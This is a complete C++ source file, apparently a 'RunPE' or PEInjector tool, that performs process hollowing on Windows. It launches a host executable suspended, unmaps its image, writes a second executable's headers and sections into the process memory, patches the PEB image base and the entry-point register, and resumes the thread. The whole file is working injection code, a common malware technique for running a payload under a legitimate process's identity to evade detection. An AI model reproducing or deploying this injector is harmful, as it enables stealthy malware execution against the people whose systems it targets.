#include <windows.h>
#include <stdio.h>

/*
	TESTS:
		Windows 10 x64
*/

/*
	BUILD:
		g++ RunPE.cpp -m32 -o RunPE.exe
		g++ RunPE.cpp -o RunPE.exe
*/

/*
	TODO:
		1) Make sure you have a valid PE file
		2) Make sure the architecture of PEInjector, host_exe, injected_exe are the same
		3) Kill the host_process if the injection is not successfull
		4) Add documentation
		5) If you cannot relocate, check if the process has aslr, if so just try over and over again
		6) Replace NtUnmapViewOfSection with normal VirtualFreeEx, if you couldn't 
			use VirtualProtectEx to make the whole region unexecutable
		7) Make more tests
		8) Both PE and the process should have the same lpNtHeader->OptionalHeader.Subsystem so
			to get the NT_HEADERS of the suspended process use https://stackoverflow.com/questions/8336214/how-can-i-get-a-process-entry-point-address
*/

/*
	PROBLEMS:
		1) For unknown reason these scenarios generates 0xc0000005 error at 
			Resuming the process when NtUnmapViewOfSection is used without the
			condition before it
				+ injecting x32 fixed base PE to x32 process with different fixed base
				+ injecting any type x32 PE to x32 process with dynamic-base 
			possible solution (TODO:6)
*/

BOOL RunPe(LPCSTR szHostExe, LPCSTR szInjectedFile)
{

	STARTUPINFOA ProcessStartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	ZeroMemory(
		&ProcessInfo,
		sizeof(ProcessInfo));

	ZeroMemory(&ProcessStartupInfo,
		sizeof(ProcessStartupInfo));

	ProcessStartupInfo.cb = sizeof(ProcessStartupInfo);

	if (!CreateProcessA(
		szHostExe,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&ProcessStartupInfo,
		&ProcessInfo
	))
	{
		printf("Error at CreateProcessA, code = %d\n", GetLastError());
		return FALSE;
	};

	HANDLE hFile;
	if (!(hFile = CreateFileA(
		szInjectedFile,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	)) || INVALID_HANDLE_VALUE == hFile)
	{
		printf("Error at CreateFileA, code = %d\n", GetLastError());
		return FALSE;
	};

	LARGE_INTEGER u32FileSize;
	if (!GetFileSizeEx(
		hFile,
		&u32FileSize
	))
	{
		printf("Error at GetFileSizeEx, code = %d\n", GetLastError());
		return FALSE;
	};

	LPVOID lpPeContent;
	if (!(lpPeContent = VirtualAlloc(
		NULL,
		u32FileSize.QuadPart,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_READWRITE
	)))
	{
		printf("Error at VirtualAlloc, code = %d\n", GetLastError());
		return FALSE;
	};

	DWORD dwReadBytes;
	if (!ReadFile(
		hFile,
		lpPeContent,
		u32FileSize.QuadPart,
		&dwReadBytes,
		NULL
	))
	{
		printf("Error at ReadFile, code = %d\n", GetLastError());
		return FALSE;
	};

	CloseHandle(hFile);

	PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)lpPeContent;
	PIMAGE_NT_HEADERS lpNtHeader = (PIMAGE_NT_HEADERS)((LONG_PTR)lpPeContent + lpDosHeader->e_lfanew);

#if defined(_M_X64) || defined(__amd64__)
	ULONGLONG lpPreferableBase = lpNtHeader->OptionalHeader.ImageBase;
#else
	ULONG lpPreferableBase = lpNtHeader->OptionalHeader.ImageBase;
#endif

	CONTEXT ThreadContext;

	ZeroMemory(
		&ThreadContext,
		sizeof(CONTEXT));

	ThreadContext.ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(
		ProcessInfo.hThread,
		&ThreadContext
	))
	{
		printf("Error at GetThreadContext, code = %d\n", GetLastError());
		return FALSE;
	};

	LPVOID lpPebImageBase;
#if defined(_M_X64) || defined(__amd64__)
	lpPebImageBase = (LPVOID)(ThreadContext.Rdx + 2 * sizeof(ULONGLONG));
#else
	lpPebImageBase = (LPVOID)(ThreadContext.Ebx + 2 * sizeof(ULONG));
#endif

	SIZE_T stReadBytes;
	PVOID lpOriginalImageBase;

#if defined(_M_X64) || defined(__amd64__)
	ULONGLONG dwOriginalImageBase;
	if (!ReadProcessMemory(
		ProcessInfo.hProcess,
		lpPebImageBase,
		&dwOriginalImageBase,
		sizeof(dwOriginalImageBase),
		&stReadBytes
	))
	{
		printf("Error at ReadProcessMemory, 0x%x, code = %d\n", lpPebImageBase, GetLastError());
		return FALSE;
	};
	lpOriginalImageBase = (PVOID)dwOriginalImageBase;
#else
	ULONG dwOriginalImageBase;
	if (!ReadProcessMemory(
		ProcessInfo.hProcess,
		lpPebImageBase,
		&dwOriginalImageBase,
		sizeof(dwOriginalImageBase),
		&stReadBytes
	))
	{
		printf("Error at ReadProcessMemory, code = %d\n", GetLastError());
		return FALSE;
	};
	lpOriginalImageBase = (PVOID)dwOriginalImageBase;
#endif
	
	if (lpOriginalImageBase == (LPVOID)lpPreferableBase)
	{
		HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
		FARPROC NtUnmapViewOfSection = GetProcAddress(hNtdll, "NtUnmapViewOfSection");

		if ((*(NTSTATUS(*)(HANDLE, PVOID)) NtUnmapViewOfSection)(
			ProcessInfo.hProcess,
			lpOriginalImageBase
			))
		{
			printf("Error at NtUnmapViewOfSection, code = %d\n", GetLastError());
			return FALSE;
		};
	};

	LPVOID lpAllocatedBase;
	if (!(lpAllocatedBase = VirtualAllocEx(
		ProcessInfo.hProcess,
		(LPVOID)lpPreferableBase,
		lpNtHeader->OptionalHeader.SizeOfImage,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	)))
	{
		if (GetLastError() == ERROR_INVALID_ADDRESS)
		{
			if (!(lpAllocatedBase = VirtualAllocEx(
				ProcessInfo.hProcess,
				NULL,
				lpNtHeader->OptionalHeader.SizeOfImage,
				(MEM_COMMIT | MEM_RESERVE),
				PAGE_EXECUTE_READWRITE
			)))
			{
				printf("Error at VirtualAllocEx, code = %d\n", GetLastError());
				return FALSE;
			};
		}
		else
		{
			printf("Error at VirtualAllocEx, code = %d\n", GetLastError());
			return FALSE;
		}
	};

	if (lpOriginalImageBase != lpAllocatedBase)
	{
		SIZE_T stWrittenBytes;
		if (!WriteProcessMemory(
			ProcessInfo.hProcess,
			lpPebImageBase,
			&lpAllocatedBase,
			sizeof(lpAllocatedBase),
			&stWrittenBytes
		))
		{
			printf("Error at WriteProcessMemory, code = %d\n", GetLastError());
			return FALSE;
		};
	}

	lpNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
	
	if (lpAllocatedBase != (LPVOID)lpPreferableBase)
	{
		if (lpNtHeader->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)
		{
			printf("Cannot relocate the PE because the relocation table is stripped\n");
			return FALSE;
		}
		else
		{

#if defined(_M_X64) || defined(__amd64__)
			lpNtHeader->OptionalHeader.ImageBase = (ULONGLONG)lpAllocatedBase;
#else
			lpNtHeader->OptionalHeader.ImageBase = (ULONG)lpAllocatedBase;
#endif

			DWORD lpRelocationTableBaseRva = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

			PIMAGE_SECTION_HEADER lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
			DWORD dwRelocationTableBaseOffset = 0;
			for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++) {
				if (lpRelocationTableBaseRva >= lpHeaderSection[dwSecIndex].VirtualAddress &&
					lpRelocationTableBaseRva < lpHeaderSection[dwSecIndex].VirtualAddress + lpHeaderSection[dwSecIndex].Misc.VirtualSize) {
					dwRelocationTableBaseOffset = lpHeaderSection[dwSecIndex].PointerToRawData + lpRelocationTableBaseRva - lpHeaderSection[dwSecIndex].VirtualAddress;
					break;
				}
			};

			LPVOID lpRelocationTableBase = (LPVOID)((DWORD_PTR)lpPeContent + dwRelocationTableBaseOffset);
			DWORD dwRelocationTableSize = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

			for (DWORD dwMemIndex = 0; dwMemIndex < dwRelocationTableSize;)
			{
				IMAGE_BASE_RELOCATION* lpBaseRelocBlock = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)lpRelocationTableBase + dwMemIndex);
				LPVOID lpBlocksEntery = (LPVOID)((DWORD_PTR)lpBaseRelocBlock + sizeof(lpBaseRelocBlock->SizeOfBlock) + sizeof(lpBaseRelocBlock->VirtualAddress));

				DWORD dwNumberOfBlocks = (lpBaseRelocBlock->SizeOfBlock - sizeof(lpBaseRelocBlock->SizeOfBlock) - sizeof(lpBaseRelocBlock->VirtualAddress)) / sizeof(WORD);
				WORD* lpBlocks = (WORD*)lpBlocksEntery;

				for (DWORD dwBlockIndex = 0; dwBlockIndex < dwNumberOfBlocks; dwBlockIndex++)
				{
					WORD wBlockType = (lpBlocks[dwBlockIndex] & 0xf000) >> 0xC;
					WORD wBlockOffset = lpBlocks[dwBlockIndex] & 0x0fff;

					if ((wBlockType == IMAGE_REL_BASED_HIGHLOW) || (wBlockType == IMAGE_REL_BASED_DIR64))
					{
						DWORD dwAdrressToFixRva = lpBaseRelocBlock->VirtualAddress + (DWORD)wBlockOffset;

						lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
						DWORD dwAdrressToFixOffset = 0;
						for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++) {
							if (dwAdrressToFixRva >= lpHeaderSection[dwSecIndex].VirtualAddress &&
								dwAdrressToFixRva < lpHeaderSection[dwSecIndex].VirtualAddress + lpHeaderSection[dwSecIndex].Misc.VirtualSize) {
								dwAdrressToFixOffset = lpHeaderSection[dwSecIndex].PointerToRawData + dwAdrressToFixRva - lpHeaderSection[dwSecIndex].VirtualAddress;
								break;
							};
						};

#if defined(_M_X64) || defined(__amd64__)
						ULONGLONG* lpAddressToFix = (ULONGLONG*)((DWORD_PTR)lpPeContent + dwAdrressToFixOffset);
						*lpAddressToFix -= lpPreferableBase;
						*lpAddressToFix += (ULONGLONG)lpAllocatedBase;
#else
						ULONG* lpAddressToFix = (ULONG*)((DWORD_PTR)lpPeContent + dwAdrressToFixOffset);
						*lpAddressToFix -= lpPreferableBase;
						*lpAddressToFix += (ULONG)lpAllocatedBase;
#endif

					};
				};
				dwMemIndex += lpBaseRelocBlock->SizeOfBlock;
			};
		};
	};

#if defined(_M_X64) || defined(__amd64__)
	ThreadContext.Rcx = (ULONGLONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint;
#else
	ThreadContext.Eax = (ULONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint;
#endif

	if (!SetThreadContext(
		ProcessInfo.hThread,
		&ThreadContext
	))
	{
		printf("Error at SetThreadContext, code = %d\n", GetLastError());
		return FALSE;
	};

	SIZE_T stWrittenBytes;
	if (!WriteProcessMemory(
		ProcessInfo.hProcess,
		lpAllocatedBase,
		lpPeContent,
		lpNtHeader->OptionalHeader.SizeOfHeaders,
		&stWrittenBytes
	))
	{
		printf("Error at WriteProcessMemory, code = %d\n", GetLastError());
		return FALSE;
	};

	DWORD dwOldProtect;
	if (!VirtualProtectEx(
		ProcessInfo.hProcess,
		lpAllocatedBase,
		lpNtHeader->OptionalHeader.SizeOfHeaders,
		PAGE_READONLY,
		&dwOldProtect
	))
	{
		printf("Error at VirtualProtectEx, code = %d\n", GetLastError());
		return FALSE;
	};

	IMAGE_SECTION_HEADER* lpSectionHeaderArray = (IMAGE_SECTION_HEADER*)((ULONG_PTR)lpPeContent + lpDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	for (int i = 0; i < lpNtHeader->FileHeader.NumberOfSections; i++)
	{
		if (!WriteProcessMemory(
			ProcessInfo.hProcess,
#if defined(_M_X64) || defined(__amd64__)
			(LPVOID)((ULONGLONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
#else
			(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
#endif
			(LPCVOID)((DWORD_PTR)lpPeContent + lpSectionHeaderArray[i].PointerToRawData),
			lpSectionHeaderArray[i].SizeOfRawData,
			&stWrittenBytes
		))
		{
			printf("Error at WriteProcessMemory, code = %d\n", GetLastError());
			return FALSE;
		};

		DWORD dwSectionMappedSize = 0;
		if (i == lpNtHeader->FileHeader.NumberOfSections - 1) {
			dwSectionMappedSize = lpNtHeader->OptionalHeader.SizeOfImage - lpSectionHeaderArray[i].VirtualAddress;
		}
		else {
			dwSectionMappedSize = lpSectionHeaderArray[i + 1].VirtualAddress - lpSectionHeaderArray[i].VirtualAddress;
		}

		DWORD dwSectionProtection = 0;
		if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			dwSectionProtection = PAGE_EXECUTE_READWRITE;
		}
		else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ)) {
			dwSectionProtection = PAGE_EXECUTE_READ;
		}
		else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			dwSectionProtection = PAGE_EXECUTE_WRITECOPY;
		}
		else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			dwSectionProtection = PAGE_READWRITE;
		}
		else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			dwSectionProtection = PAGE_EXECUTE;
		}
		else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) {
			dwSectionProtection = PAGE_READONLY;
		}
		else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
			dwSectionProtection = PAGE_WRITECOPY;
		}
		else {
			dwSectionProtection = PAGE_NOACCESS;
		}

		if (!VirtualProtectEx(
			ProcessInfo.hProcess,
#if defined(_M_X64) || defined(__amd64__)
			(LPVOID)((ULONGLONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
#else
			(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
#endif
			dwSectionMappedSize,
			dwSectionProtection,
			&dwOldProtect
		))
		{
			printf("Error at VirtualProtectEx, code = %d\n", GetLastError());
			return FALSE;
		};
	};

	if (ResumeThread(
		ProcessInfo.hThread
	) == -1)
	{
		printf("Error at ResumeThread, code = %d\n", GetLastError());
		return FALSE;
	};

	return TRUE;
}

INT main(INT argc, CHAR** argv) {

	if (argc > 2)
	{
		if (RunPe(argv[1], argv[2]))
		{
			puts("Done !!!");
		}
	}
	else
	{
		printf("%s [host_exe] [injected_exe]\n", argv[0]);
	}
	return 0;
}
